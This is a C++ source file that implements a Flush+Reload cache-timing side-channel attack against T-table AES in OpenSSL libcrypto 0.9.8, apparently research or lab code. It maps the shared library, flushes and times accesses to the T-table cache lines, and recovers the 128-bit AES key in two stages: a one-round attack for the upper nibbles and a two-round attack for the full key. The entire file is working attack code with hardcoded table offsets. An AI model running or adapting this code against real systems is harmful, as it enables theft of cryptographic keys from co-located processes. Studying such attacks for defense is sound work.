#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>
#include <algorithm>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (133)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1000)

//AES sBox for encryption
unsigned char sBox[] =
{ /*  0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f */
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76, /*0*/ 
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0, /*1*/
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15, /*2*/
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75, /*3*/
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84, /*4*/
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf, /*5*/
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8, /*6*/ 
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2, /*7*/
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73, /*8*/
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb, /*9*/
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79, /*a*/
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08, /*b*/
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a, /*c*/
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e, /*d*/
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf, /*e*/
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16  /*f*/
};

//AES inverse sBox
unsigned char inv_sBox[256] = 
 {
    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D
 };

//1-round AES encryption: x_2, x_5, x_8, x_15
unsigned char XTIME(unsigned char x) 
{
    return ((x << 1) ^ ((x & 0x80) ? 0x1b : 0x00));
}
unsigned char E1_x_2(unsigned char p[], unsigned char key[]){
  return sBox[p[0]^key[0]] ^ sBox[p[5]^key[5]] ^ XTIME(sBox[p[10]^key[10]]) ^ XTIME(sBox[p[15]^key[15]]) ^ sBox[p[15]^key[15]] ^ sBox[key[15]] ^ key[2];
}

unsigned char E1_x_5(unsigned char p[], unsigned char key[]){
  return sBox[p[4]^key[4]] ^ sBox[p[3]^key[3]] ^ XTIME(sBox[p[9]^key[9]]) ^ XTIME(sBox[p[14]^key[14]]) ^ sBox[p[14]^key[14]] ^ sBox[key[14]] ^ key[1] ^ key[5];
}

unsigned char E1_x_8(unsigned char p[], unsigned char key[]){
  return sBox[p[2]^key[2]] ^ sBox[p[7]^key[7]] ^ XTIME(sBox[p[8]^key[8]]) ^ XTIME(sBox[p[13]^key[13]]) ^ sBox[p[13]^key[13]] ^ sBox[key[13]] ^ key[0] ^ key[4] ^ key[8] ^ 1;
}

unsigned char E1_x_15(unsigned char p[], unsigned char key[]){
  return sBox[p[1]^key[1]] ^ sBox[p[6]^key[6]] ^ XTIME(sBox[p[11]^key[11]]) ^ XTIME(sBox[p[12]^key[12]]) ^ sBox[p[12]^key[12]] ^ sBox[key[12]] ^ key[15] ^ key[3] ^ key[7] ^ key[11];
}

unsigned char key[] =
{
  0xc0, 0xf0, 0xa0, 0x00, 0x00, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x03,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings, timings2;

char* base;
char* probe;
char* end;
int T[4] = {0x128100, 0x127D00, 0x127900, 0x127500}; // offsets of T-tables in libcryto.so, change according to your libcrypto.so 


template<typename KeyType, typename ValueType> 
std::pair<KeyType,ValueType> get_max( const std::map<KeyType,ValueType>& x ) {
  using pairtype=std::pair<KeyType,ValueType>; 
  return *std::max_element(x.begin(), x.end(), [] (const pairtype & p1, const pairtype & p2) {
        return p1.second < p2.second;
  }); 
}

int main()
{
  int fd = open("libcrypto.so.0.9.8", O_RDONLY); //load the libcrypto.so 
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];
  uint64_t min_time = rdtsc();
  srand(min_time);
  printf("Key used for encryption\n");
  for (size_t j = 0; j < 16; ++j){ //randomize the key for encryption
          key[j] = rand() % 256;
    printf("%02x ", key[j]);
  }
  printf("\n");

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  
  sum = 0;

 unsigned char key_guess[16];

 //-------------------------one-round attack for upper 4 bits in each key byte------------------------------
 printf("Higher bits recoverd\n");
 for (size_t b =0; b < 16; ++b){ // the b-th byte
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    unsigned char key_guess = byte;
       
    for (size_t l = 0; l < 1; ++l) // recover by any single memory line 
    {
    	probe = base + T[b % 4] + 64 * l;
    	size_t count=0;
    	
    	for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)  
    	{
      	for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
        plaintext[b] = ((l * 16) + (rand() % 16)) ^ key_guess;
        flush(probe);
      	AES_encrypt(plaintext, ciphertext, &key_struct);
      	sched_yield();
      	size_t time = rdtsc();
      	maccess(probe);
      	size_t delta = rdtsc() - time;
      	sched_yield();
      	if (delta < MIN_CACHE_MISS_CYCLES)
      	{ 
	  			count++;
      	}     
      	sched_yield();
      	timings[probe][byte] = count;
      	sched_yield();
    	}
    }

  }
    
  auto max=get_max(timings[probe]);
  key_guess[b] = max.first;
  printf("%02x ", (unsigned char)key_guess[b]);
 }//end of b bytes
  printf("\n");

 //-------------------------------two-round attack for full key----------------------------------
  //--k_0,k_5,k_10, k_15--
  probe = base + T[2]; //by first memory line
  for (size_t k_0 = 0; k_0 < 16; ++k_0){
    key_guess[0] = (key_guess[0] >> 4 << 4) ^ k_0;
    for (size_t k_5 = 0; k_5 < 16; ++k_5){
      key_guess[5] = (key_guess[5] >> 4 << 4) ^ k_5;
      for (size_t k_10 = 0; k_10 < 16; ++k_10){
        key_guess[10] = (key_guess[10] >> 4 << 4) ^ k_10;
        for (size_t k_15 = 0; k_15 < 16; ++k_15){
	  			key_guess[15] = (key_guess[15] >> 4 << 4) ^ k_15;
   
	    		size_t count = 0;
    	    
	    		for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
	    		{
	      		for (size_t j = 0; j < 16; ++j)
	        		plaintext[j] = rand() % 256;
            plaintext[0] = inv_sBox[E1_x_2(plaintext,key_guess) ^ sBox[plaintext[0]^key_guess[0]] ^ (rand()%16)] ^ key_guess[0];
	     		  if (not (E1_x_2(plaintext,key_guess)/16 == 0))
         			{printf("x_2 wrong sample\n");return 0; }
	      		flush(probe);
	      		AES_encrypt(plaintext, ciphertext, &key_struct);
	      		sched_yield();
	      		size_t time = rdtsc();
	      		maccess(probe);
	      		size_t delta = rdtsc() - time;
            sched_yield();
	      		if (delta < MIN_CACHE_MISS_CYCLES)
							count++;
	    	  }
	        sched_yield();
	        timings2[probe][(k_0<<12) ^ (k_5<<8) ^ (k_10<<4) ^ k_15] = count;
	        sched_yield();
        }
      }
    }
  }
  auto max=get_max(timings2[probe]);
  key_guess[0] = (key_guess[0] >> 4 << 4) ^ (max.first >> 12);
  key_guess[5] = (key_guess[5] >> 4 << 4) ^ ((max.first >> 8) & 0xf);
  key_guess[10] = (key_guess[10] >> 4 << 4) ^ ((max.first >> 4) & 0xf);
  key_guess[15] = (key_guess[15] >> 4 << 4) ^ (max.first & 0xf);

  //--k_3,k_4,k_9, k_14--
  probe = base + T[1]; //by first memory line
  for (size_t k_0 = 0; k_0 < 16; ++k_0){
    key_guess[3] = (key_guess[3] >> 4 << 4) ^ k_0;
    for (size_t k_5 = 0; k_5 < 16; ++k_5){
      key_guess[4] = (key_guess[4] >> 4 << 4) ^ k_5;
      for (size_t k_10 = 0; k_10 < 16; ++k_10){
        key_guess[9] = (key_guess[9] >> 4 << 4) ^ k_10;
        for (size_t k_15 = 0; k_15 < 16; ++k_15){
	       key_guess[14] = (key_guess[14] >> 4 << 4) ^ k_15;
         
	    size_t count = 0;
    	    
	    for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
	    {
	      for (size_t j = 0; j < 16; ++j)
	        plaintext[j] = rand() % 256;
              plaintext[4] = inv_sBox[E1_x_5(plaintext,key_guess) ^ sBox[plaintext[4]^key_guess[4]] ^ (rand()%16)] ^ key_guess[4];
	      if (not (E1_x_5(plaintext,key_guess)/16 == 0))
         	{printf("x_5 wrong sample\n");return 0; }
	      flush(probe);
	      AES_encrypt(plaintext, ciphertext, &key_struct);
	      sched_yield();
	      size_t time = rdtsc();
	      maccess(probe);
	      size_t delta = rdtsc() - time;
              sched_yield();
	      if (delta < MIN_CACHE_MISS_CYCLES)
		      count++;
	    }
	    sched_yield();
	    timings2[probe][(k_0<<12) ^ (k_5<<8) ^ (k_10<<4) ^ k_15] = count;
	    sched_yield();

        }
      }
    }
  }
  max=get_max(timings2[probe]);
  key_guess[3] = (key_guess[3] >> 4 << 4) ^ (max.first >> 12);
  key_guess[4] = (key_guess[4] >> 4 << 4) ^ ((max.first >> 8) & 0xf);
  key_guess[9] = (key_guess[9] >> 4 << 4) ^ ((max.first >> 4) & 0xf);
  key_guess[14] = (key_guess[14] >> 4 << 4) ^ (max.first & 0xf);
  
  //--k_2,k_7,k_8, k_13--
  probe = base + T[0]; //by first memory line
  for (size_t k_0 = 0; k_0 < 16; ++k_0){
    key_guess[2] = (key_guess[2] >> 4 << 4) ^ k_0;
    for (size_t k_5 = 0; k_5 < 16; ++k_5){
      key_guess[7] = (key_guess[7] >> 4 << 4) ^ k_5;
      for (size_t k_10 = 0; k_10 < 16; ++k_10){
        key_guess[8] = (key_guess[8] >> 4 << 4) ^ k_10;
        for (size_t k_15 = 0; k_15 < 16; ++k_15){
	       key_guess[13] = (key_guess[13] >> 4 << 4) ^ k_15;
         
	    size_t count = 0;
    	    
	    for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
	    {
	      for (size_t j = 0; j < 16; ++j)
	        plaintext[j] = rand() % 256;
              plaintext[2] = inv_sBox[E1_x_8(plaintext,key_guess) ^ sBox[plaintext[2]^key_guess[2]] ^ (rand()%16)] ^ key_guess[2];
	      if (not (E1_x_8(plaintext,key_guess)/16 == 0))
         	{printf("x_8 wrong sample\n");return 0; }
	      flush(probe);
	      AES_encrypt(plaintext, ciphertext, &key_struct);
	      sched_yield();
	      size_t time = rdtsc();
	      maccess(probe);
	      size_t delta = rdtsc() - time;
              sched_yield();
	      if (delta < MIN_CACHE_MISS_CYCLES)
		      count++;
	    }
	    sched_yield();
	    timings2[probe][(k_0<<12) ^ (k_5<<8) ^ (k_10<<4) ^ k_15] = count;
	    sched_yield();

        }
      }
    }
  }
  max=get_max(timings2[probe]);
  key_guess[2] = (key_guess[2] >> 4 << 4) ^ (max.first >> 12);
  key_guess[7] = (key_guess[7] >> 4 << 4) ^ ((max.first >> 8) & 0xf);
  key_guess[8] = (key_guess[8] >> 4 << 4) ^ ((max.first >> 4) & 0xf);
  key_guess[13] = (key_guess[13] >> 4 << 4) ^ (max.first & 0xf);
  
  //--k_1,k_6,k_11, k_12--
  probe = base + T[3]; //by first memory line
  for (size_t k_0 = 0; k_0 < 16; ++k_0){
    key_guess[1] = (key_guess[1] >> 4 << 4) ^ k_0;
    for (size_t k_5 = 0; k_5 < 16; ++k_5){
      key_guess[6] = (key_guess[6] >> 4 << 4) ^ k_5;
      for (size_t k_10 = 0; k_10 < 16; ++k_10){
        key_guess[11] = (key_guess[11] >> 4 << 4) ^ k_10;
        for (size_t k_15 = 0; k_15 < 16; ++k_15){
	        key_guess[12] = (key_guess[12] >> 4 << 4) ^ k_15;
         
	    size_t count = 0;
    	    
	    for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
	    {
	      for (size_t j = 0; j < 16; ++j)
	        plaintext[j] = rand() % 256;
              plaintext[1] = inv_sBox[E1_x_15(plaintext,key_guess) ^ sBox[plaintext[1]^key_guess[1]] ^ (rand()%16)] ^ key_guess[1];
	      if (not (E1_x_15(plaintext,key_guess)/16 == 0))
         	{printf("x_15 wrong sample\n");return 0; }
	      flush(probe);
	      AES_encrypt(plaintext, ciphertext, &key_struct);
	      sched_yield();
	      size_t time = rdtsc();
	      maccess(probe);
	      size_t delta = rdtsc() - time;
              sched_yield();
	      if (delta < MIN_CACHE_MISS_CYCLES)
		      count++;
	    }
	    sched_yield();
	    timings2[probe][(k_0<<12) ^ (k_5<<8) ^ (k_10<<4) ^ k_15] = count;
	    sched_yield();

        }
      }
    }
  }
  max=get_max(timings2[probe]);
  key_guess[1] = (key_guess[1] >> 4 << 4) ^ (max.first >> 12);
  key_guess[6] = (key_guess[6] >> 4 << 4) ^ ((max.first >> 8) & 0xf);
  key_guess[11] = (key_guess[11] >> 4 << 4) ^ ((max.first >> 4) & 0xf);
  key_guess[12] = (key_guess[12] >> 4 << 4) ^ (max.first & 0xf);

  printf("Full key recoverd\n");
  for (int i =0; i< 16; i++)
  {if (key_guess[i]==key[i])
       printf("%02x ",key_guess[i]);
  }
  printf("\n");
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

